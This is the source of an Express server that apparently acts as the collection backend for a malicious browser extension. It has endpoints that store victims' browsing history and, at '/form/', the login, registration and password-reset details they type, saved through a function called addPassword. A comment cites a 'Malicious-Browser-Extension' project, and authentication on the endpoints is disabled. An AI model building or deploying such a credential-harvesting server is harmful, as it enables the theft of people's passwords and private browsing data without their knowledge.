import express from "express";
import bodyParser from "body-parser";
// import path from "path";

import { InputError, AccessError } from "./error";
import SaveData from "./util/SaveData";
const sd = new SaveData();

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const catchErrors = (fn) => async (req, res) => {
  try {
    await fn(req, res);
    // save();
  } catch (err) {
    console.log("CAUGHT ERROR", err.message);
    if (err instanceof InputError) {
      res.status(400).send({ error: err.message });
    } else if (err instanceof AccessError) {
      res.status(403).send({ error: err.message });
    } else {
      console.log(err);
      res.status(500).send({ error: "A system error ocurred" });
    }
  }
};

const authed = (fn) => async (req, res) => {
  // TODO maybe do token check
  // const pass = req.header("Authorization");
  // if (pass !== process.env.POSTGRES_EDIT_TOKEN) {
  //   throw new AccessError("Invalid Token");
  // }
  await fn(req, res);
};

// Serve our base route that returns a Hello World cow
app.get(
  "/test/",
  catchErrors(async (req, res) => {
    const moo = "mooooooo!";
    res.json({ moo });
  })
);

// /****************************************************************
//                           Add New User
// ****************************************************************/

app.post(
  "/user/add/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, extension_id, version, date_created, history } = req.body;
      // generate date stamp (here or from request?)

      if (!uid) throw new InputError("uid is undefined.");

      const result = await sd.addUser(uid, {
        uid,
        extension_id,
        version,
        date_created,
        history_updated: date_created,
        history,
      });
      res.json({ result: result });
    })
  )
);

// /****************************************************************
//                        Logging Saved Data
// ****************************************************************/

// USER ID
// https://github.com/nigamaviral/Malicious-Browser-Extension/blob/master/extension/background.js#L228
// https://stackoverflow.com/a/23854032

// Update history data
app.post(
  "/history/add/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, historyItem } = req.body;
      const result = await sd.addHistoryItem(uid, historyItem);
      res.json({ result: result });
    })
  )
);

// /****************************************************************
//                        Logging Live Data
// ****************************************************************/

// Log currently entered account details (login/register/reset password)
app.post(
  "/form/",
  catchErrors(
    authed(async (req, res) => {
      const { uid, date_created, form, location, tab } = req.body;
      // generate date stamp (here or from request?)

      const result = await sd.addPassword(uid, {
        date_created,
        form,
        location,
        tab,
      });
      res.json({ result });
    })
  )
);

/********************** Running the server ************************/

// Choose the port and start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Starting server on port ${PORT}`);
});
